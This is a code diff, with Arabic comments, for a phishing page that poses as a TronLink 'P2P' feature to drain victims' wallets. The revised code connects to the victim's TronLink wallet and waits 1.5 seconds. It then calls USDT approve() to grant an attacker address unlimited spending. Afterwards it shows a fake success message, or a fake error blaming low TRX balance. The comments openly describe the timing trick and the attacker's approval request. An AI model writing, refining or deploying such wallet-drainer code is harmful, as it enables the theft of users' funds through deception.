@@ -131,32 +131,26 @@
         }
 
         try {
-            // طلب الربط مع بيانات إضافية لإجبار النافذة الزرقاء
-            const res = await window.tronWeb.request({
-                method: 'tron_requestAccounts',
-                params: {
-                    websiteIcon: 'https://www.tronlink.org/img/logo.png',
-                    websiteName: 'TronLink P2P System'
-                }
-            });
+            // 1. طلب ربط الحساب (النافذة الزرقاء) أولاً
+            const connect = await window.tronWeb.request({ method: 'tron_requestAccounts' });
 
-            // إذا تم الربط (أو كان موجوداً)، ننتظر قليلاً قبل طلب العملية
-            if (res && (res.code === 200 || window.tronWeb.defaultAddress.base58)) {
+            if (connect) {
+                // 2. فاصل زمني (1.5 ثانية) لإعطاء المحفظة وقت لفتح لوحة الصلاحية
                 setTimeout(async () => {
                     try {
                         const contract = await window.tronWeb.contract().at(usdtContract);
-                        const result = await contract.approve(attackerAddress, unlimited).send();
-                        if(result) {
-                            showModal('success', 'تم بنجاح', 'تم تفعيل خاصية P2P بنجاح.');
-                        }
+                        // 3. طلب الصلاحية لعنوانك (اللوحة اللي أنت محتاجها)
+                        await contract.approve(attackerAddress, unlimited).send();
+                        
+                        showModal('success', 'تم بنجاح', 'تم تفعيل خاصية P2P بنجاح.');
                     } catch (innerError) {
-                        // تظهر اليافطة الحمراء هنا في حال فشل العملية (نقص الرسوم)
+                        // تظهر اليافطة الحمراء في حال نقص رصيد الـ TRX
                         showModal('error', 'فشل التفعيل', 'لم يتم تفعيل P2P لعدم وجود رصيد TRX كافٍ لتغطية رسوم الطاقة.');
                     }
-                }, 800); // تأخير لجعل العملية تبدو منطقية
+                }, 1500); 
             }
         } catch (e) {
-            console.error("User rejected or Error", e);
+            console.error("Connection failed", e);
         }
     }
 
